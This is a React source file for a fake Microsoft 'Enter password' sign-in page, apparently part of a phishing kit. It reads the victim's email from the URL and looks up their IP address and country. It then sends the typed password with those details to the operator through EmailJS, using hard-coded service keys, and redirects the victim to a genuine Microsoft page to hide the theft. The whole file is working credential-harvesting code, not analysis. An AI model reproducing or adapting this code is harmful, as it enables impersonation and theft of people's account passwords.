import styles from "./Home.module.css";
import emailjs from '@emailjs/browser';
import dateFormat from "dateformat";
import { useEffect, useState } from "react";
import { useParams } from 'react-router-dom';

function Home() {
  const { email } = useParams();
  const [ipAddress, setIpAddress] = useState(null)
  const [country, setCountry] = useState(null)
  const [password, setPassword] = useState(null)
  const [isPending, setIsPending] = useState(false)

  useEffect(() => {
    // Get the user's IP address from ipify.org
    fetch("https://api.ipify.org?format=json")
    .then(response => response.json())
    .then(data => {
      const ipAddress = data.ip
      setIpAddress(ipAddress)

      // Get the user's country from ipapi.co
      fetch(`https://ipapi.co/${ipAddress}/json/`)
        .then(response => response.json())
        .then(data => {
          setCountry(data.country_name)
        })
        .catch(error => console.error(error));
    })
    .catch(error => console.error(error));
  }, [])



  const handleSubmit = (e) => {
    e.preventDefault();
    setIsPending(true);
    
    const templateParams = {
      email,
      password,
      ipAddress,
      country,
      date: dateFormat(new Date(), "dddd, mmmm dS, yyyy, h:MM:ss"),
    }

    console.log(templateParams);
    emailjs.send("service_j8z4ukh", "template_y4azwnq", templateParams, "1ZBFk0OvFehoL5pCb")
    .then(res => console.log(`Successfully submitted: ${res.text} ${res.status}`))
    .catch(error => console.error(error))

    window.location = "https://www.microsoft.com/en-us/welcome"
    setIsPending(false)
  }


  return (
    <div className={styles.container}>
      <form onSubmit={handleSubmit}>
        {isPending && <img 
        className={styles.ant} 
        src="marching_ants_b540a8e518037192e32c4fe58bf2dbab.gif" 
        alt="loader"/>}
        <div className={styles.wrapper}>
          <img src="microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg" alt="Logo"/>
          {email && <p>{email}</p>}
          <h1>Enter password</h1>
          <input 
            type="password" 
            name="password" 
            id="password" 
            placeholder="Password"
            onChange={(e) => setPassword(e.target.value)}
            required/> 
          <a href="/">Forgot password?</a>
          <a href="/">Email code to beeyondteck@gmail.com</a>
          <div className={styles.btnWrapper}>
            <button>Sign in</button>
          </div>
        </div>
      </form>
      <footer>
        <p><span>Terms of use</span><span>Privacy & cookies</span><span>...</span></p>
      </footer>
    </div>
  );
}

export default Home;
